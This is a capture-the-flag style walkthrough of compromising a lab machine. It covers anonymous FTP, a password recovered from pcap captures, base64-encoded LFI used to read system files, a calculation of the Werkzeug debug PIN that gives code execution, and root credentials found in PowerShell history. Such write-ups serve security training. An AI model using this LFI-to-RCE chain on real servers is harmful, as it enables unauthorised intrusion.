# Reconstruction

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 192.168.183.103
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 00:04 +08
Nmap scan report for 192.168.183.103
Host is up (0.17s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
8080/tcp open  http-proxy
```

### Anonymous FTP --> Wireshark Password

FTP allows anonymous logins:

```
$ ftp 192.168.183.103 
Connected to 192.168.183.103.
220 (vsFTPd 3.0.3)
Name (192.168.183.103:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||49037|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Apr 29  2020 WebSOC
-rw-r--r--    1 0        0             137 Apr 29  2020 note.txt
ftp> cd WebSOC
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||32250|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0         3086771 Apr 29  2020 1.05.2020.pcap
-rw-r--r--    1 0        0          869677 Apr 29  2020 29.04.2020.pcap
-rw-r--r--    1 0        0        14579662 Apr 29  2020 30.04.2020.pcap
```

`note.txt` mentions that there are passwords within the files:

```
I've just setup the new WebSOC! This should hopefully help us catch these filthy hackers!

TODO: remove leftover passwords from testing
```

Most of the PCAP files contained traffic generated from brute forcing the site, so it was pretty tedious looking through all of them. The `30.04.2020` PCAP file contained a lot of brute force attempts, while `1.05.2020` contained very few:

<figure><img src="../../../.gitbook/assets/image (2080).png" alt=""><figcaption></figcaption></figure>

And within that PCAP file, we can find a request that has a password that seems to work:

<figure><img src="../../../.gitbook/assets/image (2213).png" alt=""><figcaption></figcaption></figure>

### Web Enum --> LFI

Port 8000 hosted the same Flask application:

<figure><img src="../../../.gitbook/assets/image (579).png" alt=""><figcaption></figcaption></figure>

With the password we found earlier, we can login:

<figure><img src="../../../.gitbook/assets/image (2585).png" alt=""><figcaption></figcaption></figure>

Attempting to view the 'Hello World' blog entry results in an error from Flask:

<figure><img src="../../../.gitbook/assets/image (2081).png" alt=""><figcaption></figcaption></figure>

There's a feature within this kind of web application that allows us to access the console to run Python code, but this one is protected by the PIN:

<figure><img src="../../../.gitbook/assets/image (3963).png" alt=""><figcaption></figcaption></figure>

I ran a directory scan using `wfuzz`:

{% code overflow="wrap" %}
```
$ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc=308,404 -t 100 http://192.168.183.103:8080/FUZZ/
000000182:   302        3 L      24 W       253 Ch      "data"                      
000001225:   200        66 L     126 W      2011 Ch     "logout"                    
000001387:   302        3 L      24 W       257 Ch      "create"
```
{% endcode %}

There were just these 3 directories. `create` is pretty obvious in what it does, but `data` was not. Visiting it just shows this:

<figure><img src="../../../.gitbook/assets/image (930).png" alt=""><figcaption></figcaption></figure>

Testing any directories with this shows the same page, but with a new header:

<figure><img src="../../../.gitbook/assets/image (2777).png" alt=""><figcaption></figcaption></figure>

The `X-Error` showing `Incorrect Padding` is present, and when googled the first thing that comes up is `base64`:

<figure><img src="../../../.gitbook/assets/image (2126).png" alt=""><figcaption></figcaption></figure>

If we use the `base64` encoded string of `/etc/passwd`, we get another unique error:

<figure><img src="../../../.gitbook/assets/image (939).png" alt=""><figcaption></figcaption></figure>

Now there's an error saying there's no file or directory triggered by the newline character. This means we have LFI on the server if we use `echo -n`!

### Werkzeug PIN Calculation --> RCE

Since we have LFI on the Werkzeug server, we can actually calculate the PIN required.&#x20;

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug" %}

{% embed url="https://blog.gregscharf.com/2023/04/09/lfi-to-rce-in-flask-werkzeug-application/" %}

Using our LFI, we can get the parameters required. First, we need to get the ARP Address of the machine. First, we can find the ARP cache to identify the interface used:

```
$ echo -n '/proc/net/arp' | base64
L3Byb2MvbmV0L2FycA==
```

<figure><img src="../../../.gitbook/assets/image (3924).png" alt=""><figcaption></figcaption></figure>

`ens160` is the interface name needed to find the ARP address:

```
$ echo -n '/sys/class/net/ens160/address' | base64
L3N5cy9jbGFzcy9uZXQvZW5zMTYwL2FkZHJlc3M=
```

<figure><img src="../../../.gitbook/assets/image (2144).png" alt=""><figcaption></figcaption></figure>

Convert this to decimal using `python`:

```
$ python3       
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print(0x005056ba311e)
345052426526
```

Next, we need to get the machine ID.

```
$ echo -n '/etc/machine-id' | base64              
L2V0Yy9tYWNoaW5lLWlk
```

<figure><img src="../../../.gitbook/assets/image (1990).png" alt=""><figcaption></figcaption></figure>

The machine ID needed some service name appended to the back of it, which we can get from reading `/proc/self/cgroup`.&#x20;

<figure><img src="../../../.gitbook/assets/image (1265).png" alt=""><figcaption></figcaption></figure>

We also need the user that started the application, which can be found in `/proc/self/environ`:

<figure><img src="../../../.gitbook/assets/image (1984).png" alt=""><figcaption></figcaption></figure>

Afterwards, I tested it a few times, varying the public bits and testing the machine ID with and without `blog.service` appended to the end of it and eventually got it:

```python
probably_public_bits = [
    'www-data',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.6/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '345052425031',# str(uuid.getnode()),  /sys/class/net/ens33/address
    '00566233196142e9961b4ea12a2bdb29'# get_machine_id(), /etc/machine-id
]
```

<figure><img src="../../../.gitbook/assets/image (712).png" alt=""><figcaption></figcaption></figure>

From here, we can easily get a reverse shell on our machine.&#x20;

<figure><img src="../../../.gitbook/assets/image (3050).png" alt=""><figcaption></figcaption></figure>

We cannot read the user flag yet.

## Privilege Escalation

### Jack Creds

Within `app.py` for the Flask website, we can find some credentials:

```
#ADMIN_PASSWORD = 'ee05d64d2528102d45e2db60986727ed'
ADMIN_PASSWORD = '1edfa9b54a7c0ec28fbc25babb50892e'
```

We can `su` to `jack` using the commented password.

<figure><img src="../../../.gitbook/assets/image (1769).png" alt=""><figcaption></figcaption></figure>

### Powershell --> Root Creds

Within the home directory of the user, I enumerated the directories present and noticed that there was a Powershell directory:

```
jack@reconstruction:~$ ls -la .local/share
total 12
drwxr-xr-x 3 root root 4096 Sep 30  2020 .
drwxr-xr-x 3 root root 4096 Sep 30  2020 ..
drwxr-xr-x 3 root root 4096 Sep 30  2020 powershell
```

Obviously this was rather odd. If we read the `ConsoleHost_History.txt` file at the end of it, we find this:

```
Write-Host -ForegroundColor Green -BackgroundColor White Holy **** this works!
Write-Host -ForegroundColor Red -BackgroundColor Black Holy **** this works as well!
su FlauntHiddenMotion845
clear history
clear
cls
exit
```

This password can be used to `su` to `root`:

<figure><img src="../../../.gitbook/assets/image (1006).png" alt=""><figcaption></figcaption></figure>
